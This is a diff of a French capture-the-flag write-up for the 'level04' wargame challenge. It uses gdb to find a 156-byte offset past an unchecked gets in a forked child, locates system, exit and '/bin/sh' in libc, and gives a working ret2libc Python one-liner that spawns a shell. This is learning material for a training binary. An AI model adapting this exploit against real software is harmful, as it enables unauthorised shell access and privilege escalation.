@@ -1,1 +1,80 @@
-(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
+On voit que le programe attend un shellcode quand on le lance:
+level04@OverRide:~$ ./level04
+Give me some shellcode, k
+test
+child is exiting...
+
+La ligne "child is exiting" nous indique qu'il y a un process enfant. 
+On peut le confirmer sous gdb:
+0x080486d6 <+14>:	call   0x8048550 <fork@plt>
+
+Vu que le gets n'est pas protege, on va essaye de le faire overflow. Pour trouver l'offset auquel on reecrit l'eip, on va break apres le gets:
+(gdb) b * 0x08048763
+Breakpoint 2 at 0x8048763
+
+Vu que l'on veut suivre le comportement du process enfant, on va indiquer a gdb:
+set follow-fork-mode child
+
+Breakpoint 2, 0x08048763 in main ()
+(gdb) i r
+eax            0xffffd670	-10640
+ecx            0xf7fd08c4	-134412092
+edx            0xffffd670	-10640
+ebx            0xffffd670	-10640
+esp            0xffffd650	0xffffd650
+ebp            0xffffd708	0xffffd708
+esi            0x0	0
+edi            0xffffd6f0	-10512
+eip            0x8048763	0x8048763 <main+155>
+eflags         0x282	[ SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) i f
+Stack level 0, frame at 0xffffd710:
+ eip = 0x8048763 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args:
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
+
+On voit eax = 0xffffd670 et eip = 0xffffd70c.
+Nous pouvons calculer l'offset grace a:
+>>> 0xffffd70c - 0xffffd670
+156
+
+Nous allons maintenant chercher les addresses de "system", "exit" et "/bin/sh" afin de faire un ret2libc:
+(gdb) x system 
+0xf7e6aed0 <system>:	 "\203\354\034\211t$\024\213t$ \211\\$\020菮\016"
+(gdb) x exit
+0xf7e5eb70 <exit>:	 "S\350\375q\017"
+(gdb) info proc mappings 
+process 2722
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+	0xf7e2b000 0xf7e2c000     0x1000        0x0 
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0 
+	0xf7fd8000 0xf7fda000     0x2000        0x0 
+	0xf7fda000 0xf7fdb000     0x1000        0x0 
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+Cela nous donne la commande python suivante:
+(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04 
